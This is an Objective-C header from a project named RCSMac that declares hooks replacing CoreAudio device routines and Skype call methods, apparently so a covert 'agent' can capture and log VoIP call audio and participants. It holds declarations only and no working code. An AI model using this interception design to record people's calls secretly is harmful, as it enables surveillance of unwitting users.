//
//  RCSMAgentVoip_IM.h
//  RCSMac
//
//  Created by revenge on 10/23/09.
//  Copyright 2009 __MyCompanyName__. All rights reserved.
//

#import <CoreAudio/CoreAudio.h>
#import <QTKit/QTKit.h>

#ifndef __RCSMAgentVoip_h__
#define __RCSMAgentVoip_h__

#import "RCSMInputManager.h"
#import "RCSMCommon.h"


void VPSKypeStartAgent();
void VPSKypeStopAgent();

BOOL logCall (u_int, BOOL);

OSStatus
(*_real_AudioDeviceIOProcInput) (AudioDeviceID,
                                 const AudioTimeStamp *,
                                 const AudioBufferList *,
                                 const AudioTimeStamp *,
                                 AudioBufferList *,
                                 const AudioTimeStamp *,
                                 void *);

OSStatus
(*_real_AudioDeviceIOProcOutput) (AudioDeviceID,
                                  const AudioTimeStamp *,
                                  const AudioBufferList *,
                                  const AudioTimeStamp *,
                                  AudioBufferList *,
                                  const AudioTimeStamp *,
                                  void *);

OSStatus
_hook_AudioDeviceIOProc (AudioDeviceID         inDevice,
                         const AudioTimeStamp  *inNow,
                         const AudioBufferList *inInputData,
                         const AudioTimeStamp  *inInputTime,
                         AudioBufferList       *outOutputData,
                         const AudioTimeStamp  *inOutputTime,
                         void                  *inClientData);

OSStatus
(*_real_AudioDeviceStart) (AudioDeviceID,
                           AudioDeviceIOProcID);

OSStatus
_hook_AudioDeviceStart (AudioDeviceID           inDevice,
                        AudioDeviceIOProcID     inProcID);

OSStatus
(*_real_AudioDeviceStop) (AudioDeviceID,
                          AudioDeviceIOProcID);

OSStatus
_hook_AudioDeviceStop (AudioDeviceID           inDevice,
                       AudioDeviceIOProcID     inProcID);

OSStatus
(*_real_AudioDeviceAddIOProc) (AudioDeviceID,
                               AudioDeviceIOProc,
                               void *);

OSStatus
_hook_AudioDeviceAddIOProc (AudioDeviceID       inDevice,
                            AudioDeviceIOProc   inProc,
                            void               *inClientData);

OSStatus
(*_real_AudioDeviceRemoveIOProc) (AudioDeviceID,
                                  AudioDeviceIOProc);

OSStatus
_hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
                               AudioDeviceIOProc   inProc);

OSStatus
(*_real_AudioDeviceCreateIOProcID) (AudioDeviceID,
                                    AudioDeviceIOProc,
                                    void *,
                                    AudioDeviceIOProcID *);

OSStatus
_hook_AudioDeviceCreateIOProcID (AudioDeviceID inDevice,
                                 AudioDeviceIOProc inProc,
                                 void *inClientData,
                                 AudioDeviceIOProcID *outAudioProcID);

OSStatus
(*_real_AudioDeviceSetProperty) (AudioDeviceID,
                                 const AudioTimeStamp *,
                                 UInt32,
                                 Boolean,
                                 AudioDevicePropertyID,
                                 UInt32,
                                 const void *);

OSStatus
_hook_AudioDeviceSetProperty (AudioDeviceID           inDevice,
                              const AudioTimeStamp    *inWhen,
                              UInt32                  inChannel,
                              Boolean                 isInput,
                              AudioDevicePropertyID   inPropertyID,
                              UInt32                  inPropertyDataSize,
                              const void              *inPropertyData);

OSStatus
(*_real_AudioDeviceGetProperty) (AudioDeviceID,
                                 UInt32,
                                 Boolean,
                                 AudioDevicePropertyID,
                                 UInt32 *,
                                 void *);

OSStatus
_hook_AudioDeviceGetProperty (AudioDeviceID           inDevice,
                              UInt32                  inChannel,
                              Boolean                 isInput,
                              AudioDevicePropertyID   inPropertyID,
                              UInt32                  *ioPropertyDataSize,
                              void                    *outPropertyData);

// Just to avoid compiler warnings
/*@interface MacCallX

- (uint)placeCallTo: (id)arg1;
- (void)answer;

- (id)activeCallMembers;
- (id)activeCallMemberIdentities;
- (id)callMemberIdentities;
- (id)callMembers;
- (id)callName;

- (id)hostIdentity;
- (id)firstActiveMember;

@end*/

@interface myMacCallX : NSObject

- (uint)placeCallToHook: (id)arg1;
- (void)answerHook;
- (void)checkActiveMembersName;

@end

#endif